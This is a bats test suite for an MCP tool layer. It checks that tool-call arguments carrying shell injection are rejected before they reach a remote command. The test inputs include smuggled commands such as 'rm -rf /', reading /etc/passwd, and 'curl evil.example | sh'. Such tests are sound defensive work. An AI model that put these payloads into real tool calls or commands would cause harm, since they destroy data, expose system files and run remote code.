#!/usr/bin/env bats
# ==================================================
# tests/test_mcp_tools.bats — Tests for lib/mcp/tools.sh argument validation
# ==================================================
# Run:  bats tests/test_mcp_tools.bats
# Covers: P0 audit finding — MCP tool-call args must be validated before
# reaching strut (they can flow into a remote shell string built by
# run_remote_strut for host-scoped stacks).

setup() {
  CLI_ROOT="$(cd "$(dirname "$BATS_TEST_FILENAME")/.." && pwd)"
  STRUT_HOME="$CLI_ROOT"
  export CLI_ROOT STRUT_HOME
  source "$CLI_ROOT/lib/mcp/tools.sh"

  # Fake strut_bin so tool-call tests never touch a real project/stack —
  # only the validation layer (which runs before strut_bin is invoked) is
  # under test here.
  TEST_TMP="$(mktemp -d)"
  cat > "$TEST_TMP/strut" << 'EOF'
#!/usr/bin/env bash
echo "CALLED: $*"
EOF
  chmod +x "$TEST_TMP/strut"
  STRUT_HOME="$TEST_TMP"
  export STRUT_HOME
}

teardown() {
  rm -rf "$TEST_TMP"
}

# ── _mcp_arg ──────────────────────────────────────────────────────────────────

@test "_mcp_arg: accepts a plain identifier" {
  run _mcp_arg '{"stack":"my-app"}' stack
  [ "$status" -eq 0 ]
  [ "$output" = "my-app" ]
}

@test "_mcp_arg: accepts dots and underscores" {
  run _mcp_arg '{"stack":"my_app.v2"}' stack
  [ "$status" -eq 0 ]
  [ "$output" = "my_app.v2" ]
}

@test "_mcp_arg: falls back to default when field is absent" {
  run _mcp_arg '{}' env prod
  [ "$status" -eq 0 ]
  [ "$output" = "prod" ]
}

@test "_mcp_arg: rejects a semicolon (command chaining)" {
  run _mcp_arg '{"service":"x; rm -rf /"}' service
  [ "$status" -eq 1 ]
}

@test "_mcp_arg: rejects command substitution" {
  run _mcp_arg '{"stack":"$(touch /tmp/pwned)"}' stack
  [ "$status" -eq 1 ]
}

@test "_mcp_arg: rejects backticks" {
  run _mcp_arg '{"stack":"`touch /tmp/pwned`"}' stack
  [ "$status" -eq 1 ]
}

@test "_mcp_arg: rejects a space (breaks out of the remote command string)" {
  run _mcp_arg '{"host":"a b"}' host
  [ "$status" -eq 1 ]
}

@test "_mcp_arg: rejects pipe and redirection characters" {
  run _mcp_arg '{"stack":"x|cat /etc/passwd"}' stack
  [ "$status" -eq 1 ]
  run _mcp_arg '{"stack":"x>/tmp/out"}' stack
  [ "$status" -eq 1 ]
}

# ── _mcp_arg_lines ────────────────────────────────────────────────────────────

@test "_mcp_arg_lines: accepts a plain integer" {
  run _mcp_arg_lines '{"lines":100}'
  [ "$status" -eq 0 ]
  [ "$output" = "100" ]
}

@test "_mcp_arg_lines: defaults to 50 when absent" {
  run _mcp_arg_lines '{}'
  [ "$status" -eq 0 ]
  [ "$output" = "50" ]
}

@test "_mcp_arg_lines: rejects a non-numeric value" {
  run _mcp_arg_lines '{"lines":"50; touch /tmp/pwned"}'
  [ "$status" -eq 1 ]
}

# ── _mcp_tools_call: injection attempts are rejected before strut_bin runs ────

@test "_mcp_tools_call strut_status: rejects an injection payload in stack" {
  run _mcp_tools_call strut_status '{"stack":"demo; touch /tmp/pwned #"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

@test "_mcp_tools_call strut_logs: rejects an injection payload in service" {
  run _mcp_tools_call strut_logs '{"stack":"demo","service":"x\$(touch /tmp/pwned)"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

@test "_mcp_tools_call strut_sync: rejects an injection payload in host" {
  run _mcp_tools_call strut_sync '{"host":"a; curl evil.example | sh"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

@test "_mcp_tools_call strut_backup: rejects an injection payload in target" {
  run _mcp_tools_call strut_backup '{"stack":"demo","target":"all; rm -rf /"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

@test "_mcp_tools_call strut_deploy: rejects an injection payload in env" {
  run _mcp_tools_call strut_deploy '{"stack":"demo","env":"prod; touch /tmp/pwned"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"isError"* ]]
  [[ "$output" != *"CALLED:"* ]]
}

# ── _mcp_tools_call: legitimate calls still reach strut_bin ────────────────────

@test "_mcp_tools_call strut_status: a valid stack name reaches strut_bin" {
  run _mcp_tools_call strut_status '{"stack":"demo"}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"CALLED: demo status --env prod --json"* ]]
}

@test "_mcp_tools_call strut_logs: a valid stack+service reaches strut_bin" {
  run _mcp_tools_call strut_logs '{"stack":"demo","service":"web","lines":100}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"CALLED: demo logs web --tail 100 --env prod"* ]]
}

@test "_mcp_tools_call strut_list: no-arg tools are unaffected" {
  run _mcp_tools_call strut_list '{}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"CALLED: list --json"* ]]
}

@test "_mcp_tools_call: unknown tool still returns isError" {
  run _mcp_tools_call strut_nonexistent '{}'
  [ "$status" -eq 0 ]
  [[ "$output" == *"Unknown tool"* ]]
  [[ "$output" == *"isError"* ]]
}
